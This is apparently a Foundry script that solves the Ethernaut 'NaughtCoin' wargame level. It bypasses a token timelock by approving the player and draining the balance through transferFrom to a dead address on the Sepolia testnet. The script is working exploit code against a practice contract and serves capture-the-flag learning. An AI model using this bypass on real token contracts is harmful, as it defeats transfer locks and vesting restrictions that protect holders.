// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level15NaughtCoin.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: Complete this level by getting your token balance to 0.

contract Level15Solution is Script {
    NaughtCoin public naughtCoin =
        NaughtCoin(0xe32e3A31bBf99e0Ab39C2EfC664c038ac9F1e4FB);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address playerAddress = naughtCoin.player();

        // The player has a timelock on their tokens, preventing them from transferring
        // them until a certain time has passed. However, the contract allows the player
        // to transfer tokens using `transferFrom` without the timelock restriction.
        // Give allowance to the player to transfer tokens with `transferFrom` without the timelock restriction
        naughtCoin.approve(playerAddress, type(uint256).max);

        uint256 amount = naughtCoin.balanceOf(playerAddress);
        console.log("balance before attack:", amount);

        naughtCoin.transferFrom(playerAddress, address(0xDead), amount);

        amount = naughtCoin.balanceOf(playerAddress);
        console.log("balance after attack:", amount);

        vm.stopBroadcast();
    }
}

// forge script script/Level15Solution.s.sol:Level15Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
